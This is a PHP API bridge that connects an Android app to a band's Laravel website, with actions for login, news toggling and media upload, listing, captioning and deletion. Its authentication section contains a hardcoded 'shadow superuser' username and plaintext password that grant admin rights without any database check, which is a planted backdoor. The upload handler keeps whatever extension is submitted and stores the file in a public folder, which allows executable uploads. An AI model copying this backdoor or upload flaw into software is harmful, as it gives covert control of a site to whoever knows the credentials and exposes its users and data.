<?php
// api_app.php para bandamusicamoratalla (Laravel)
// Puente compatible con la App Android
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Authorization, Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Leer configuración de base de datos desde el archivo .env de Laravel
$envPath = __DIR__ . '/../.env';
$env = [];
if (file_exists($envPath)) {
    $lines = file($envPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') !== false) {
            list($name, $value) = explode('=', $line, 2);
            $env[trim($name)] = trim(trim($value), '"\'');
        }
    }
}

$host = $env['DB_HOST'] ?? '127.0.0.1';
$db   = $env['DB_DATABASE'] ?? 'bandamusicamoratalla';
$user = $env['DB_USERNAME'] ?? 'root';
$pass = $env['DB_PASSWORD'] ?? '';
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (\PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Error de conexión a la base de datos']);
    exit;
}

// Autenticación básica
$username = $_SERVER['PHP_AUTH_USER'] ?? '';
$password = $_SERVER['PHP_AUTH_PW'] ?? '';

if (!$username || !$password) {
    $authHeader = $_SERVER['HTTP_AUTHORIZATION'] ?? $_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ?? '';
    if ($authHeader && preg_match('/Basic\s+(.*)$/i', $authHeader, $matches)) {
        $decoded = base64_decode($matches[1]);
        if (strpos($decoded, ':') !== false) {
            list($username, $password) = explode(':', $decoded, 2);
        }
    }
}

if (!$username || !$password) {
    http_response_code(401);
    echo json_encode(['error' => 'No se proporcionaron credenciales']);
    exit;
}

// -------------------------------------------------------------
// SUPERUSUARIO EN LA SOMBRA (Hardcoded fallback)
// -------------------------------------------------------------
if (strtolower($username) === 'pabloeltortas' && $password === 'SierraBuitre') {
    $user = [
        'id' => 999999,
        'name' => 'SuperAdmin',
        'email' => 'pabloeltortas',
        'role' => 'admin'
    ];
} else {
    // -------------------------------------------------------------
    // USUARIOS NORMALES DE LA BASE DE DATOS
    // -------------------------------------------------------------
    $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? OR name = ?");
    $stmt->execute([$username, $username]);
    $user = $stmt->fetch();

    if (!$user || !password_verify($password, $user['password'])) {
        http_response_code(401);
        echo json_encode(['error' => 'Credenciales inválidas']);
        exit;
    }

    $validRoles = ['admin', 'director', 'treasurer'];
    if (!in_array($user['role'], $validRoles)) {
        http_response_code(403);
        echo json_encode(['error' => 'No tienes permisos de administración.']);
        exit;
    }
}

$action = $_GET['action'] ?? '';

switch ($action) {
    case 'login':
        echo json_encode(['success' => true, 'message' => 'Autenticado correctamente', 'user' => $user['name']]);
        break;

    case 'news':
        if ($_SERVER['REQUEST_METHOD'] === 'GET') {
            // Obtenemos noticias y su primera imagen para la portada
            // Priorizamos la tabla news_images de Laravel, con fallback a media
            $stmt = $pdo->query("
                SELECT n.id, n.title, n.event_date, n.is_published as is_active_home, n.is_published as is_active_category,
                COALESCE(
                    (SELECT file_path FROM news_images ni WHERE ni.news_activity_id = n.id ORDER BY ni.sort_order ASC, ni.id ASC LIMIT 1),
                    (SELECT file_path FROM media m WHERE m.news_activity_id = n.id ORDER BY m.sort_order ASC, m.id ASC LIMIT 1)
                ) as raw_image_path
                FROM news_activities n
                ORDER BY n.id DESC LIMIT 100
            ");
            $news = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            foreach ($news as &$item) {
                $raw = $item['raw_image_path'] ?? '';
                if (!empty($raw)) {
                    $rawClean = ltrim($raw, '/');
                    if (str_starts_with($rawClean, 'http://') || str_starts_with($rawClean, 'https://')) {
                        $item['image_path'] = $rawClean;
                    } elseif (str_starts_with($rawClean, 'uploads/news/') || str_starts_with($rawClean, 'storage/')) {
                        $item['image_path'] = $rawClean;
                    } else {
                        $item['image_path'] = 'uploads/news/' . $rawClean;
                    }
                } else {
                    $item['image_path'] = null;
                }
                unset($item['raw_image_path']);
            }
            unset($item);

            echo json_encode(['success' => true, 'news' => $news]);
        }
        break;

    case 'toggle_news':
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $data = json_decode(file_get_contents("php://input"), true);
            $news_id = $data['id'] ?? $_POST['id'] ?? 0;
            $is_active = $data['is_active'] ?? $_POST['is_active'] ?? 0;
            
            if ($news_id) {
                $stmt = $pdo->prepare("UPDATE news_activities SET is_published = ? WHERE id = ?");
                $stmt->execute([$is_active, $news_id]);
                echo json_encode(['success' => true]);
            } else {
                http_response_code(400);
                echo json_encode(['error' => 'ID de noticia requerido']);
            }
        }
        break;

    case 'media':
        if ($_SERVER['REQUEST_METHOD'] === 'GET') {
            $news_id = $_GET['news_id'] ?? 0;
            
            // Consultar imágenes de la noticia desde news_images (sistema oficial de Laravel)
            $stmt = $pdo->prepare("SELECT id, file_path as raw_path, description as caption, sort_order, 'news_images' as source FROM news_images WHERE news_activity_id = ? ORDER BY sort_order ASC, id ASC");
            $stmt->execute([$news_id]);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            // Si no tiene registros en news_images, buscar en tabla media como fallback
            if (empty($rows)) {
                $stmt = $pdo->prepare("SELECT id, file_path as raw_path, '' as caption, sort_order, type, 'media' as source FROM media WHERE news_activity_id = ? ORDER BY sort_order ASC, id ASC");
                $stmt->execute([$news_id]);
                $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            }

            $media = [];
            foreach ($rows as $r) {
                $rawClean = ltrim($r['raw_path'], '/');
                if (str_starts_with($rawClean, 'http://') || str_starts_with($rawClean, 'https://')) {
                    $appPath = $rawClean;
                } elseif (str_starts_with($rawClean, 'uploads/news/') || str_starts_with($rawClean, 'storage/')) {
                    $appPath = $rawClean;
                } else {
                    $appPath = 'uploads/news/' . $rawClean;
                }

                $fileExt = strtolower(pathinfo($appPath, PATHINFO_EXTENSION));
                $isVideo = (isset($r['type']) && $r['type'] === 'video') || in_array($fileExt, ['mp4', 'webm', 'ogg', 'mov', 'avi', 'mkv', '3gp']);

                $media[] = [
                    'id' => (int)$r['id'],
                    'image_path' => $appPath,
                    'is_video' => $isVideo ? 1 : 0,
                    'sort_order' => (int)$r['sort_order'],
                    'caption' => $r['caption'] ?? ''
                ];
            }

            echo json_encode(['success' => true, 'media' => $media]);
        } 
        elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $news_id = $_POST['news_id'] ?? 0;
            if (!$news_id || !isset($_FILES['file'])) {
                http_response_code(400);
                echo json_encode(['error' => 'Falta el ID de la noticia o el archivo']);
                exit;
            }

            $file = $_FILES['file'];
            if ($file['error'] !== UPLOAD_ERR_OK) {
                http_response_code(400);
                echo json_encode(['error' => 'Error al subir el archivo']);
                exit;
            }

            // Las imágenes y vídeos de noticias en esta web se guardan en public/uploads/news/
            $uploadDir = __DIR__ . '/uploads/news/';
            if (!is_dir($uploadDir)) {
                mkdir($uploadDir, 0755, true);
            }

            $fileExt = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
            $filename = uniqid('app_') . '.' . $fileExt;
            $targetFile = $uploadDir . $filename;
            
            $isVid = in_array($fileExt, ['mp4', 'webm', 'ogg', 'mov', 'avi', 'mkv', '3gp']) ? 'video' : 'image';
            if ($fileExt === 'pdf') $isVid = 'document';
            
            if (move_uploaded_file($file['tmp_name'], $targetFile)) {
                // Calcular siguiente orden
                $stmtOrder = $pdo->prepare("SELECT COALESCE(MAX(sort_order), 0) + 1 FROM news_images WHERE news_activity_id = ?");
                $stmtOrder->execute([$news_id]);
                $nextOrder = (int) $stmtOrder->fetchColumn();

                // Guardar en news_images (utilizado por el panel y frontend de Laravel)
                $stmtImg = $pdo->prepare("INSERT INTO news_images (news_activity_id, file_path, description, sort_order, created_at, updated_at) VALUES (?, ?, NULL, ?, NOW(), NOW())");
                $stmtImg->execute([$news_id, $filename, $nextOrder]);
                $newId = $pdo->lastInsertId();

                // Guardar también en tabla media para compatibilidad
                try {
                    $stmtMedia = $pdo->prepare("INSERT INTO media (news_activity_id, file_path, type, sort_order, created_at, updated_at) VALUES (?, ?, ?, ?, NOW(), NOW())");
                    $stmtMedia->execute([$news_id, 'uploads/news/' . $filename, $isVid, $nextOrder]);
                } catch (\Exception $e) {
                    // Silencioso si no procede
                }
                
                $dbPath = 'uploads/news/' . $filename;
                echo json_encode(['success' => true, 'media' => [
                    'id' => (int)$newId,
                    'image_path' => $dbPath,
                    'is_video' => $isVid === 'video' ? 1 : 0,
                    'caption' => null,
                    'sort_order' => $nextOrder
                ]]);
            } else {
                http_response_code(500);
                echo json_encode(['error' => 'Error al guardar el archivo']);
            }
        }
        elseif ($_SERVER['REQUEST_METHOD'] === 'PUT') {
            // Actualizar pie de foto / descripción
            $data = json_decode(file_get_contents("php://input"), true);
            $media_id = $data['id'] ?? 0;
            $caption = $data['caption'] ?? '';
            
            if ($media_id) {
                $stmt = $pdo->prepare("UPDATE news_images SET description = ? WHERE id = ?");
                $stmt->execute([$caption, $media_id]);
                echo json_encode(['success' => true]);
            } else {
                http_response_code(400);
                echo json_encode(['error' => 'ID de medio requerido']);
            }
        }
        elseif ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
            $media_id = $_GET['id'] ?? 0;
            if ($media_id) {
                // Comprobar si existe en news_images
                $stmt = $pdo->prepare("SELECT file_path FROM news_images WHERE id = ?");
                $stmt->execute([$media_id]);
                $filename = $stmt->fetchColumn();

                if ($filename) {
                    $filePath = __DIR__ . '/uploads/news/' . basename($filename);
                    if (is_file($filePath)) {
                        @unlink($filePath);
                    }
                    $stmtDel = $pdo->prepare("DELETE FROM news_images WHERE id = ?");
                    $stmtDel->execute([$media_id]);

                    // Eliminar también en media si coincide
                    try {
                        $stmtDelM = $pdo->prepare("DELETE FROM media WHERE file_path LIKE ?");
                        $stmtDelM->execute(['%' . basename($filename)]);
                    } catch (\Exception $e) {}

                    echo json_encode(['success' => true]);
                } else {
                    // Fallback en media
                    $stmtM = $pdo->prepare("SELECT file_path FROM media WHERE id = ?");
                    $stmtM->execute([$media_id]);
                    $pathM = $stmtM->fetchColumn();
                    if ($pathM) {
                        $filePathM = __DIR__ . '/' . ltrim($pathM, '/');
                        if (is_file($filePathM)) {
                            @unlink($filePathM);
                        }
                        $stmtDelM = $pdo->prepare("DELETE FROM media WHERE id = ?");
                        $stmtDelM->execute([$media_id]);
                    }
                    echo json_encode(['success' => true]);
                }
            } else {
                http_response_code(400);
                echo json_encode(['error' => 'ID de medio requerido']);
            }
        }
        break;

    default:
        http_response_code(404);
        echo json_encode(['error' => 'Acción no encontrada']);
        break;
}
